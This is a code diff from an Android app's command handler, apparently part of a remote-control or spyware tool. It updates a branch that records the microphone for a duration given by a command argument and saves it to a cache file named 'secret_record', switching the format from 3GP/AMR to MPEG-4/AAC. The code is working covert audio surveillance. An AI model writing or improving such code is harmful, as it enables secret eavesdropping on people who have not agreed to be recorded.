@@ -355,13 +355,13 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     if (checkPerm(Manifest.permission.RECORD_AUDIO)) {
                         val durationSec = textArg.toLongOrNull() ?: 5L // default merekam 5 detik
                         val durationMs = durationSec * 1000L
-                        val file = java.io.File(context.cacheDir, "secret_record.3gp")
+                        val file = java.io.File(context.cacheDir, "secret_record.mp4")
                         Thread {
                             try {
                                 val mr = android.media.MediaRecorder()
                                 mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
-                                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                                 mr.setOutputFile(file.absolutePath)
                                 mr.prepare()
                                 mr.start()
